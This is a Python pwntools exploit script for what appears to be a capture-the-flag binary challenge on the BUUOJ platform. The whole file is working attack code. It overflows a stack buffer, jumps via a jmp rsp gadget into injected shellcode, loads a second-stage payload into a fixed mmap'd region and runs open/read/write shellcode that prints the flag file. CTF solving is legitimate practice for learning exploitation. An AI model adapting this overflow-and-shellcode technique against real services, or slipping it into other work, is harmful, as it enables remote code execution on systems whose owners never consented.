# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
my_u64 = lambda x: u64(x.ljust(8, '\0'))
context.arch='amd64'

elf = ELF('./1')
p = remote('node3.buuoj.cn',28498)

jmp_esp=0x0000000000400A01
mmap=0x123000

orw_payload = shellcraft.open("./flag")
orw_payload += shellcraft.read(3, mmap, 0x50)
orw_payload += shellcraft.write(1, mmap,0x50)

payload=asm(shellcraft.read(0,mmap,0x100))+asm('mov rax,0x123000;call rax')
payload=payload.ljust(0x28,b'a')
payload+=p64(jmp_esp)+asm('sub rsp,0x30;jmp rsp')
p.recvuntil('have fun!')
p.sendline(payload)

shellcode=asm(orw_payload)
sleep(0.1)
p.sendline(shellcode)
p.interactive()
